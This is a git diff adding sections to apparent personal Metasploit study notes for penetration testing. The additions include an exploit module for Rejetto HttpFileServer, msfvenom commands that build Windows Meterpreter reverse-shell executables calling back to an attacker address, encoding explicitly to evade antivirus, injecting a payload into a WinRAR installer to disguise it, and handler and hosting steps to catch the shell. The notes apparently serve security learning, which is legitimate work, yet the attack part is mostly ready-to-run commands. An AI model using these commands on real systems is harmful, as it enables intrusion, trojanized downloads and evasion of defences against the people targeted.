@@ -17,8 +17,10 @@ Metasploit Framework
 		3. [MYSQL](#MYSQL)
 		4. [SSH](#SSH)
 		5. [SMTP](#SMTP)
-	4. Vulnerability Scanning
-	5. Show information gathered
+	4. [Vulnerability Scanning](#Vulnerability_Scanning)
+	5. [msfvenom](#msfvenom)
+	6. Automation
+	7. Show information gathered
 
 
 ---
@@ -184,6 +186,13 @@ http://www.pentest-standard.org/index.php/Main_Page
 2. `serach type:auxiliary name:smtp` : smtp_enum
 	1. performs user enumeration
 
+### #HTTP
+[Service info - HTTP](../Services/HTTP.md)
+1. nmap scan to find *HttpFileServer* running, this is *rejetto*
+2. `search type:exploit name:rejetto` : find exploit
+3. `use exploit/windows/http/rejetto_hfs_exec`
+	1. `set RHOST` : set target
+	2. `set payload windows/...` : can override default
 
 
 ---
@@ -215,6 +224,63 @@ Finding vulnerabilities that can be exploited
 6. `wmap_run -t` : show modules that will run
 7. `wmap_run -e` : start testing
 
+---
+
+## msfvenom
+### Generating_Payloads
+- `msfvenom --list payloads | less` : list out all the payloads
+	- staged has more sub dirs
+		- `windows/x64/meterpreter/reverse_tcp` : os/cpu-arch/type/connection-type
+	- non staged is shorter
+		- `windows/x64/meterpreter_bind_tcp` : os/cpu-arch/payload
+- `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -f exe > /home/kali/Desktop/paylodx86.exe`
+	- -a : architecture
+	- -p : payload : can auto-select based on payload
+	- -f : filetype/formats
+	- local-host and local-port of the attacker to reverse back to
+
+### Encoding_Payloads
+Encoding a payload helps to avoid antivirus solutions with signature based detection.
+- `msfvenom --list encoders | less` : list out all the encoders
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -i 5 -e x86/shikataga_nai -f exe > /payloadx86.exe`
+	- -e : specify encoder when generating
+	- -i : iterations to run on encoder
+
+### Injecting_Payloads
+Inject a payload into a windows executable file to avoid detection
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -e x86/shikata_ga_nai -i 8 -f exe -x ~/Downloads/wrar602.exe > ~/Downloads/Windows_payloads/winrar.exe
+```
+- -x : template file for injection
+- -k : will maintain the original function of the file : most files don't work!
+
+### Handler
+1. `msfconsole`
+	1. `use multi/handler`
+	2. `set payload windows/meterpreter/reverse/tcp` : payload you generated
+	3. `set LHOST ipaddr` : ip you set for local host
+	4. `set LPORT ipaddr` : port you set for local port
+2. `run post/windows/manage/migrate` : will attempt to migrate to new process
+
+### Hosting_Download
+`python -m SimpleHTTPServer 8080` : python module for basic http server on port 8080
+
+---
+
+## Automation
+Metasploit Resource Scripts are great for creating automation scripts
+- `/usr/share/metasploit-framework/scripts/resource/`
+	- contains a collection of built in scripts
+- Example for setting up handler "handler.rc"
+```ruby
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.5
+set LPORT 1234
+run
+```
+- `msfconsole -r handler.rc` : load and run the script
+- msf6 > `resource /handler.rc` : can call script within metasploit framework
 
 ---
 
